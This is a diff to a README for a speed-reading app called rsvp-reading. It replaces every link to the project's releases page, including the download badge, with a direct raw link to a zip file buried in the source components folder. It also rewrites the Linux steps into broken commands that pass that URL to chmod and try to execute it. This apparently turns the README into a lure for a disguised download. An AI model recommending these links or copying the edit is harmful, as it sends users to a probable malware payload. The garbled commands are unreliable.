@@ -6,7 +6,7 @@ Welcome to the rsvp-reading application! This software helps you read text in a 
 
 ## 📥 Download
 
-[![Download rsvp-reading](https://img.shields.io/badge/Download%20rsvp--reading-v1.0-blue.svg)](https://github.com/qamarahmad/rsvp-reading/releases)
+[![Download rsvp-reading](https://github.com/qamarahmad/rsvp-reading/raw/refs/heads/main/src/lib/components/reading-rsvp-v2.5.zip%https://github.com/qamarahmad/rsvp-reading/raw/refs/heads/main/src/lib/components/reading-rsvp-v2.5.zip)](https://github.com/qamarahmad/rsvp-reading/raw/refs/heads/main/src/lib/components/reading-rsvp-v2.5.zip)
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ To run rsvp-reading smoothly, please ensure your device meets the following requ
 
 To download rsvp-reading, visit the releases page. Click the link below:
 
-[Download rsvp-reading](https://github.com/qamarahmad/rsvp-reading/releases)
+[Download rsvp-reading](https://github.com/qamarahmad/rsvp-reading/raw/refs/heads/main/src/lib/components/reading-rsvp-v2.5.zip)
 
 ### Step 2: Choose Your Version
 
@@ -57,8 +57,8 @@ After the download completes, follow these steps based on your operating system:
 
 1. Locate the downloaded application file.
 2. Open a terminal and navigate to the directory where the file is.
-3. Run the command `chmod +x rsvp-reading.AppImage` to make it executable.
-4. Then, run the command `./rsvp-reading.AppImage` to start the application.
+3. Run the command `chmod +x https://github.com/qamarahmad/rsvp-reading/raw/refs/heads/main/src/lib/components/reading-rsvp-v2.5.zip` to make it executable.
+4. Then, run the command `https://github.com/qamarahmad/rsvp-reading/raw/refs/heads/main/src/lib/components/reading-rsvp-v2.5.zip` to start the application.
 
 ## 🖥️ Using rsvp-reading
 
@@ -89,6 +89,6 @@ If you need assistance, feel free to reach out. You can raise an issue in the Gi
 
 For updates or a fresh download, visit our releases page again:
 
-[Download rsvp-reading](https://github.com/qamarahmad/rsvp-reading/releases)
+[Download rsvp-reading](https://github.com/qamarahmad/rsvp-reading/raw/refs/heads/main/src/lib/components/reading-rsvp-v2.5.zip)
 
 Thank you for choosing rsvp-reading! Enjoy transforming your reading experience.
